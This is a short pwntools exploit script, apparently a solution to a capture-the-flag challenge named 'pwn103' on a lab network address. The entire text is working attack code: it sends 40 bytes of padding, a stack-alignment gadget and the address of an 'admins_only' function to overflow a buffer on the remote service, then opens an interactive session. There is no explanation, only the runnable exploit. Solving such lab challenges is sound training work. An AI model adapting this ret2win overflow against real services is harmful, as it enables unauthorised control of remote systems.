from pwn import *

context.binary = elf = ELF('./pwn103-1644300337872.pwn103')
context.bits = 64
context.log_level = 'debug'

offset = 40

admins_only = 0x0000000000401554
ret = 0x0000000000401016

p = remote('10.10.206.177', 9003)

p.sendlineafter(":", b"3")

payload = flat([
    b'A' * offset,
    ret,
    admins_only
])

p.sendlineafter("[pwner]:", payload)

p.interactive()
